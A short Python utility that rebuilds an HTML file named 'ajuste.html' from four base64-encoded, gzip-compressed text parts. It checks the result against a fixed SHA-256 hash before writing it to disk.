import argparse, base64, gzip, hashlib, pathlib

TARGET = 'ajuste.html'
EXPECTED = '9e5416efdfac75b8d28ed8b379c15bce91690a16e0fa6bb470884b28ebbb8981'
PARTS = [pathlib.Path(f'scripts/payload_parts/part{i:02d}.txt') for i in range(1, 5)]

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('--print-target', action='store_true')
    args = ap.parse_args()
    if args.print_target:
        print(TARGET)
        raise SystemExit(0)
    payload = ''.join(p.read_text().strip() for p in PARTS)
    data = gzip.decompress(base64.b64decode(payload))
    got = hashlib.sha256(data).hexdigest()
    if got != EXPECTED:
        raise SystemExit(f'hash mismatch: {got} != {EXPECTED}')
    pathlib.Path(TARGET).write_bytes(data)
    print(f'OK {TARGET} {len(data)} bytes {got}')
